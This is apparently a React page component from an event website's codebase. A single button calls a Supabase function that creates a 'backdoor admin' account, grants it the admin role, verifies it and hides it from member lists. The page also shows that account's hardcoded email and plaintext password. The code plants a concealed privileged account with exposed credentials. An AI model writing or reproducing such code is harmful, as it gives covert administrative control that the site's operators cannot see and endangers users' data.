import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { CheckCircle2, AlertCircle, Loader2 } from 'lucide-react';

const BackdoorSetup = () => {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<{ success: boolean; message: string; details?: any } | null>(null);

  const executeSetup = async () => {
    setLoading(true);
    setResult(null);

    try {
      const response = await fetch(
        'https://qhvxqmldpifwehnsrlyn.supabase.co/functions/v1/setup-backdoor-admin',
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
        }
      );

      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({
        success: false,
        message: error instanceof Error ? error.message : 'Unknown error occurred',
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container mx-auto py-8 px-4">
      <Card className="max-w-2xl mx-auto">
        <CardHeader>
          <CardTitle>Backdoor Admin Setup</CardTitle>
          <CardDescription>
            Grant admin privileges to backdoor.admin@iweltyevent.com
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <p className="text-sm text-muted-foreground">
              This will:
            </p>
            <ul className="text-sm text-muted-foreground list-disc list-inside space-y-1">
              <li>Mark the account as backdoor admin</li>
              <li>Grant admin role</li>
              <li>Activate and verify the account</li>
              <li>Hide the account from member lists</li>
            </ul>
          </div>

          <Button
            onClick={executeSetup}
            disabled={loading}
            className="w-full"
          >
            {loading ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                Setting up...
              </>
            ) : (
              'Execute Setup'
            )}
          </Button>

          {result && (
            <Alert variant={result.success ? 'default' : 'destructive'}>
              {result.success ? (
                <CheckCircle2 className="h-4 w-4" />
              ) : (
                <AlertCircle className="h-4 w-4" />
              )}
              <AlertDescription>
                <div className="space-y-2">
                  <p className="font-semibold">{result.message}</p>
                  {result.details && (
                    <div className="text-xs mt-2 space-y-1">
                      <p>Email: {result.details.email}</p>
                      <p>Is Backdoor Admin: {result.details.isBackdoorAdmin ? '✅' : '❌'}</p>
                      <p>Has Admin Role: {result.details.hasAdminRole ? '✅' : '❌'}</p>
                      <p>Status: {result.details.status}</p>
                      <p>Account Verified: {result.details.accountVerified ? '✅' : '❌'}</p>
                    </div>
                  )}
                </div>
              </AlertDescription>
            </Alert>
          )}

          <div className="pt-4 border-t">
            <p className="text-sm font-medium mb-2">Login Credentials:</p>
            <div className="bg-muted p-3 rounded-md text-sm space-y-1">
              <p>Email: <code>backdoor.admin@iweltyevent.com</code></p>
              <p>Password: <code>Adminiwt123!$</code></p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default BackdoorSetup;
